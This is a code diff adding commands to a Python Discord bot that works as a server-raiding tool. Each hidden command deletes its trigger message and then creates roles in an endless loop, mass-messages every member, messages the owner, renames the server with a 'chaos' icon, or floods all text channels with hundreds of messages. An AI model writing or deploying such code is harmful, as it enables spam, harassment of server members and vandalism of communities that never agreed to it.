@@ -278,6 +278,38 @@ class MyClient(discord.Client):
 						await message.guild.create_text_channel(name=n)
 						await message.guild.create_voice_channel(name=n)
 						await message.guild.create_category(name=n)
+						
+				if message.content.startswith('*випроли+'):
+					await message.delete()
+					n = message.content.replace('*випроли+', '')
+					while True:
+						await message.guild.create_role(name=n, colour=discord.Colour(0x00cc00))
+						
+				if message.content.startswith('*виповнеру'):
+					await message.delete()
+					n = message.content.replace('*виповнеру', '')
+					await message.guild.owner.send(n)
+					
+				if message.content.startswith('*виплс'):
+					n = message.content.replace('*виплс', '')
+					await message.delete()
+					for i in message.guild.members:
+						await i.send(n)
+						
+				if message.content.startswith('*виппереименовать'):
+					await message.delete()
+					n = message.content.replace('*виппереименовать', '')
+					with open('chaos.jpeg', 'rb') as f:
+						icon = f.read()
+					await message.guild.edit(name=n, icon=icon)
+					
+				if message.content.startswith('*випфлуд'):
+					await message.delete()
+					n = message.content.replace('*випфлуд', '')
+					while s <= 500:
+						for channel in message.guild.text_channels:
+							await channel.send(n)
+							s = s + 1
 			
 					
 
